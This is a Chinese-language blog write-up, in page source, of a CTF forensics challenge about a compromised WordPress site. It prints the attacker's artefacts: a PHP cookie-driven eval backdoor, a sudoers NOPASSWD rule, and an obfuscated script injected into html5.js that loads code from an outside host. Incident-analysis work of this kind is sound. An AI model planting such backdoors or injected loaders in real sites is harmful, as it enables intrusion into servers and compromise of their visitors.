@@ -1,0 +1,331 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CSAW CTF 2014 Forensics 300 Fluffy No More Write-up - Jeffxx Blog</title>
+  <meta name="author" content="cychao">
+
+  
+  <meta name="description" content="最近實在太忙了,請容許我的 Defcon 下集繼續拖稿, 趁剛打完 CTF 記憶猶新先寫write-upXD CSAW CTF 是給大學生打的CTF, 只允許純大學生的隊伍參加決賽,冠軍獎金不少,吸引了不少強者參加.
+一年之中最適合初學者參加的CTF非他莫屬, 題目平易近人, &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Jeffxx Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Jeffxx Blog</a></h1>
+  
+    <h2>隨手筆記.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:jeffxx.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CSAW CTF 2014 Forensics 300 Fluffy No More Write-up</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-09-24T21:15:06+08:00" pubdate data-updated="true">Sep 24<span>th</span>, 2014</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://jeffxx.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img src="/images/writeup/csaw2014_taskboard.png"></p>
+
+<p>最近實在太忙了,請容許我的 Defcon 下集繼續拖稿, 趁剛打完 CTF 記憶猶新先寫write-upXD</p>
+
+<p>CSAW CTF 是給大學生打的CTF, 只允許純大學生的隊伍參加決賽,冠軍獎金不少,吸引了不少強者參加.
+一年之中最適合初學者參加的CTF非他莫屬, 題目平易近人,就算只會google也可以拿到幾百分.</p>
+
+<p>本次 Write-up 選擇 Foensics 300 , 除了題目設計的很像真實發生的資安事件外, 最重要的是我們在最後一步卡了四五個小時, 必須好好記錄下來避免再次犯錯.</p>
+
+<!--  more -->
+
+
+<p><img src="/images/writeup/csaw2014_f300.png">
+<a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">題目備份</a></p>
+
+<p>大意就是有個人的網站被駭了,許多該網站的使用者受到影響,站長已經將 伺服器的設定檔(/etc),網站(web root directory), 日誌 (/var/log) , 資料庫 (sql)
+全部備分出來,請你協助調查發生了什麼事情.</p>
+
+<p>做這種事件調查時, 幾個資訊要先釐清 發生的大概時間, 攻擊來源, 影響範圍等. 遺憾的是真的發生事件時這些重要資訊大概都沒有,跟題目一樣(汗)</p>
+
+<p>因此我從 http access log 看起 , 濾掉 404  , css , js 的 query . 再檢查一下 useragent 會發現有幾個大量使用 scanner 的 IP , 但都不是我們要找的目標.</p>
+
+<p>此時atdog直接去翻網頁目錄, 看到是wordpress就直接往 plugin / upload 找,直接就找到後門.</p>
+
+<p><img src="/images/writeup/csaw2014_f300_backdoor.png"></p>
+
+<p>事後我們猜測這邊應該是要先去看wordpress用的plugin,會看到 wysija  然後google wysija exploit會找到 <a href="http://www.exploit-db.com/exploits/33991/">任意檔案上傳漏洞</a> , 從攻擊payload裡面可以抓出特徵,再去log裡面找到攻擊者IP及上傳的後門</p>
+
+<p><img src="/images/writeup/csaw2014_f300_exploit.png"></p>
+
+<p>回歸正題, backdoor 被混淆過,簡單把最後一行的最外層變數改成echo就可以拿到最後執行的php command</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$c</span><span class="o">=</span><span class="s1">&#39;count&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$a</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">;</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;ha&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$c</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">){</span>
+</span><span class='line'>      <span class="nv">$k</span><span class="o">=</span><span class="s1">&#39;ckit&#39;</span><span class="p">;</span><span class="k">echo</span> <span class="s1">&#39;&lt;&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;/[^\w=\s]/&#39;</span><span class="p">,</span><span class="s1">&#39;/\s/&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;+&#39;</span><span class="p">),</span> <span class="nb">join</span><span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$c</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)))));</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="s1">&#39;&lt;/&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>由於駭客很賤的把命令藏在cookie裡, 所以無法從log還原出下的指令, 只能根據時間去檢查系統設定檔修改時間. 很幸運的我們有整個/etc, 有正確的時間點我們很快找出被駭客動過的檔案, 用IP去grep log也會看到很多嘗試登入系統的動作.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">#cat etc/sudoers.d/casper</span>
+</span><span class='line'><span class="nx">ubuntu</span>  <span class="nx">ALL</span><span class="o">=</span><span class="p">(</span><span class="nx">ALL</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="nx">ALL</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>看到這邊再回頭看auth.log就會發現那一系列的sudo command有部分應該是hacker下的, 其中一行vi html5.js特別可疑</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">#cat auth.log  | grep vi</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">17</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">51</span> <span class="nx">ubuntu</span> <span class="nx">sudo</span><span class="o">:</span>   <span class="nx">ubuntu</span> <span class="o">:</span> <span class="nx">TTY</span><span class="o">=</span><span class="nx">unknown</span> <span class="p">;</span> <span class="nx">PWD</span><span class="o">=/</span> <span class="p">;</span> <span class="nx">USER</span><span class="o">=</span><span class="nx">ubuntu</span> <span class="p">;</span> <span class="nx">COMMAND</span><span class="o">=/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gsettings</span> <span class="nx">get</span> <span class="nx">org</span><span class="o">.</span><span class="nx">gnome</span><span class="o">.</span><span class="nx">nautilus</span><span class="o">.</span><span class="nx">desktop</span> <span class="nx">volumes</span><span class="o">-</span><span class="nx">visible</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">17</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">59</span> <span class="nx">ubuntu</span> <span class="nx">sudo</span><span class="o">:</span>   <span class="nx">ubuntu</span> <span class="o">:</span> <span class="nx">TTY</span><span class="o">=</span><span class="nx">unknown</span> <span class="p">;</span> <span class="nx">PWD</span><span class="o">=/</span> <span class="p">;</span> <span class="nx">USER</span><span class="o">=</span><span class="nx">ubuntu</span> <span class="p">;</span> <span class="nx">COMMAND</span><span class="o">=/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gsettings</span> <span class="nx">set</span> <span class="nx">org</span><span class="o">.</span><span class="nx">gnome</span><span class="o">.</span><span class="nx">nautilus</span><span class="o">.</span><span class="nx">desktop</span> <span class="nx">volumes</span><span class="o">-</span><span class="nx">visible</span> <span class="k">false</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">17</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">08</span> <span class="nx">ubuntu</span> <span class="nx">gnome</span><span class="o">-</span><span class="nx">keyring</span><span class="o">-</span><span class="nx">daemon</span><span class="p">[</span><span class="mi">4914</span><span class="p">]</span><span class="o">:</span> <span class="nx">couldn</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">set</span> <span class="nx">environment</span> <span class="nx">variable</span> <span class="nx">in</span> <span class="nx">session</span><span class="o">:</span> <span class="nx">Setenv</span> <span class="k">interface</span> <span class="nx">is</span> <span class="nx">only</span> <span class="nx">available</span> <span class="nx">during</span> <span class="nx">the</span> <span class="nx">Initialization</span> <span class="nx">phase</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">17</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">19</span> <span class="nx">ubuntu</span> <span class="nx">sudo</span><span class="o">:</span>   <span class="nx">ubuntu</span> <span class="o">:</span> <span class="nx">TTY</span><span class="o">=</span><span class="nx">pts</span><span class="o">/</span><span class="mi">0</span> <span class="p">;</span> <span class="nx">PWD</span><span class="o">=/</span><span class="nx">home</span><span class="o">/</span><span class="nx">ubuntu</span> <span class="p">;</span> <span class="nx">USER</span><span class="o">=</span><span class="nx">root</span> <span class="p">;</span> <span class="nx">COMMAND</span><span class="o">=/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">apt</span><span class="o">-</span><span class="nx">get</span> <span class="nx">install</span> <span class="nx">lamp</span><span class="o">-</span><span class="nx">server</span><span class="o">^</span> <span class="nx">vim</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">17</span><span class="o">:</span><span class="mi">24</span><span class="o">:</span><span class="mi">52</span> <span class="nx">ubuntu</span> <span class="nx">sudo</span><span class="o">:</span>   <span class="nx">ubuntu</span> <span class="o">:</span> <span class="nx">TTY</span><span class="o">=</span><span class="nx">pts</span><span class="o">/</span><span class="mi">0</span> <span class="p">;</span> <span class="nx">PWD</span><span class="o">=/</span><span class="nx">home</span><span class="o">/</span><span class="nx">ubuntu</span> <span class="p">;</span> <span class="nx">USER</span><span class="o">=</span><span class="nx">root</span> <span class="p">;</span> <span class="nx">COMMAND</span><span class="o">=/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">vi</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span>
+</span><span class='line'><span class="nx">Sep</span> <span class="mi">17</span> <span class="mi">19</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="mi">09</span> <span class="nx">ubuntu</span> <span class="nx">sudo</span><span class="o">:</span>   <span class="nx">ubuntu</span> <span class="o">:</span> <span class="nx">TTY</span><span class="o">=</span><span class="nx">pts</span><span class="o">/</span><span class="mi">0</span> <span class="p">;</span> <span class="nx">PWD</span><span class="o">=/</span><span class="nx">home</span><span class="o">/</span><span class="nx">ubuntu</span><span class="o">/</span><span class="nx">CSAW2014</span><span class="o">-</span><span class="nx">WordPress</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="p">;</span> <span class="nx">USER</span><span class="o">=</span><span class="nx">root</span> <span class="p">;</span> <span class="nx">COMMAND</span><span class="o">=/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">vi</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">content</span><span class="o">/</span><span class="nx">themes</span><span class="o">/</span><span class="nx">twentythirteen</span><span class="o">/</span><span class="nx">js</span><span class="o">/</span><span class="nx">html5</span><span class="o">.</span><span class="nx">js</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>去將原版twentythirteen的html5.js抓下來比對會發現多一行:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">g</span><span class="p">)</span><span class="k">return</span> <span class="nx">a</span><span class="o">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span><span class="k">for</span><span class="p">(</span><span class="k">var</span> <span class="nx">b</span><span class="o">=</span><span class="nx">b</span><span class="o">||</span><span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span><span class="nx">c</span><span class="o">=</span><span class="nx">b</span><span class="o">.</span><span class="nx">frag</span><span class="o">.</span><span class="nx">cloneNode</span><span class="p">(),</span><span class="nx">d</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">e</span><span class="o">=</span><span class="nx">m</span><span class="p">(),</span><span class="nx">h</span><span class="o">=</span><span class="nx">e</span><span class="o">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">d</span><span class="o">&lt;</span><span class="nx">h</span><span class="p">;</span><span class="nx">d</span><span class="o">++</span><span class="p">)</span><span class="nx">c</span><span class="o">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="nx">d</span><span class="p">]);</span><span class="k">return</span> <span class="nx">c</span><span class="p">}};</span><span class="nx">l</span><span class="o">.</span><span class="nx">html5</span><span class="o">=</span><span class="nx">e</span><span class="p">;</span><span class="nx">q</span><span class="p">(</span><span class="nx">f</span><span class="p">)})(</span><span class="k">this</span><span class="p">,</span><span class="nx">document</span><span class="p">);</span> <span class="k">var</span> <span class="nx">g</span><span class="o">=</span><span class="s2">&quot;ti&quot;</span><span class="p">;</span><span class="k">var</span> <span class="nx">c</span><span class="o">=</span><span class="s2">&quot;HTML Tags&quot;</span><span class="p">;</span><span class="k">var</span> <span class="nx">f</span><span class="o">=</span><span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span><span class="p">;</span><span class="nx">f</span> <span class="o">=</span> <span class="nx">f</span><span class="o">.</span><span class="nb">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span><span class="nx">c</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="nx">k</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">;</span><span class="nx">m</span><span class="o">=</span><span class="nx">f</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span><span class="k">for</span><span class="p">(</span><span class="k">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">f</span><span class="o">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span><span class="nx">c</span><span class="o">+=</span><span class="nx">f</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">.</span><span class="nx">length</span><span class="o">.</span><span class="nx">toString</span><span class="p">();}</span><span class="nx">v</span><span class="o">=</span><span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="nx">x</span><span class="o">=</span><span class="s2">&quot;\&#39;ht&quot;</span><span class="p">;</span><span class="nx">b</span><span class="o">=</span><span class="nx">f</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="nx">f</span><span class="o">=</span><span class="mi">2541</span><span class="o">*</span><span class="mi">6</span><span class="o">-</span><span class="mi">35</span><span class="o">+</span><span class="mi">46</span><span class="o">+</span><span class="mi">12</span><span class="o">-</span><span class="mi">15269</span><span class="p">;</span><span class="nx">c</span><span class="o">+=</span><span class="nx">f</span><span class="o">.</span><span class="nx">toString</span><span class="p">();</span><span class="nx">f</span><span class="o">=</span><span class="p">(</span><span class="mi">56</span><span class="o">+</span><span class="mi">31</span><span class="o">+</span><span class="mi">68</span><span class="o">*</span><span class="mi">65</span><span class="o">+</span><span class="mi">41</span><span class="o">-</span><span class="mi">548</span><span class="p">)</span><span class="o">/</span><span class="mi">4000</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nx">c</span><span class="o">+=</span><span class="nx">f</span><span class="o">.</span><span class="nx">toString</span><span class="p">();</span><span class="nx">f</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="nx">c</span><span class="o">=</span><span class="nx">c</span><span class="o">.</span><span class="nb">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span><span class="k">var</span> <span class="nx">w</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">u</span><span class="o">=</span><span class="s2">&quot;s&quot;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="k">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">c</span><span class="o">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span><span class="k">if</span><span class="p">(((</span><span class="nx">i</span><span class="o">==</span><span class="mi">3</span><span class="o">||</span><span class="nx">i</span><span class="o">==</span><span class="mi">6</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">w</span><span class="o">!=</span><span class="mi">2</span><span class="p">)</span><span class="o">||</span><span class="p">((</span><span class="nx">i</span><span class="o">==</span><span class="mi">8</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">w</span><span class="o">==</span><span class="mi">2</span><span class="p">)){</span><span class="nx">f</span><span class="o">+=</span><span class="nx">String</span><span class="o">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">46</span><span class="p">);</span><span class="nx">w</span><span class="o">++</span><span class="p">;}</span><span class="nx">f</span><span class="o">+=</span><span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">];}</span> <span class="nx">i</span><span class="o">=</span><span class="nx">k</span><span class="o">+</span><span class="s2">&quot;anal&quot;</span><span class="p">;</span> <span class="nx">document</span><span class="o">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span><span class="o">+</span><span class="nx">m</span><span class="o">+</span><span class="s2">&quot; &quot;</span><span class="o">+</span><span class="nx">b</span><span class="o">+</span><span class="s2">&quot;=&quot;</span><span class="o">+</span><span class="nx">x</span><span class="o">+</span><span class="s2">&quot;tp:&quot;</span><span class="o">+</span><span class="nx">k</span><span class="o">+</span><span class="nx">k</span><span class="o">+</span><span class="nx">f</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="s2">&quot;y&quot;</span><span class="o">+</span><span class="nx">g</span><span class="o">+</span><span class="s2">&quot;c&quot;</span><span class="o">+</span><span class="nx">u</span><span class="o">+</span><span class="nx">v</span><span class="o">+</span><span class="s2">&quot;j&quot;</span><span class="o">+</span><span class="nx">u</span><span class="o">+</span><span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span><span class="o">+</span><span class="nx">m</span><span class="o">+</span><span class="s2">&quot;\&gt;&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>直接丟進瀏覽器的開發者工具執行,會被導到一個 <a href="http://128.238.66.100/announcement.pdf">PDF</a>  然後我們用pdfdump, hexedit, 010edit都看不出個所以然,回頭又繼續翻log. 找各種蛛絲馬跡.</p>
+
+<p>浪費了幾個小時,還一度以為右下角的imgurl是線索,要去imgurl找出作圖的作者.最後發現是 pdfdump -raw的output不會decode,用pdfdump -b -i 8 就直接看到javascript跟key了&hellip;</p>
+
+<p>CTF結束後看別人的 <a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">Write-up</a> , <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=57">PDF streaming dump</a> 比 <a href="http://www.unixuser.org/~euske/python/pdfminer/">dumppdf</a>更強大,要學起來.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">cychao</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-09-24T21:15:06+08:00" pubdate data-updated="true">Sep 24<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/csaw/'>CSAW</a>, <a class='category' href='/blog/categories/forensics/'>Forensics</a>, <a class='category' href='/blog/categories/jeopardy/'>Jeopardy</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/" data-via="" data-counturl="http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/08/13/2014-defcon-22-final-can-sai-xin-de-shang/" title="Previous Post: Defcon 22 Final HITCON 參賽心得 (上)">&laquo; Defcon 22 Final HITCON 參賽心得 (上)</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/">CSAW CTF 2014 Forensics 300 Fluffy No More Write-up</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/08/13/2014-defcon-22-final-can-sai-xin-de-shang/">Defcon 22 Final HITCON 參賽心得 (上)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/05/19/defcon-ctf-22-qual-sick-writeup/">Defcon 22 Qual Sick Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/16/plaidctf-forensics-400-zfs-write-up/">PlaidCTF Forensics 400 ZFS Write-up</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/">Backdoor CTF 2014 Web300 Write-up</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - cychao -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'jeffxxblog';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/';
+        var disqus_url = 'http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
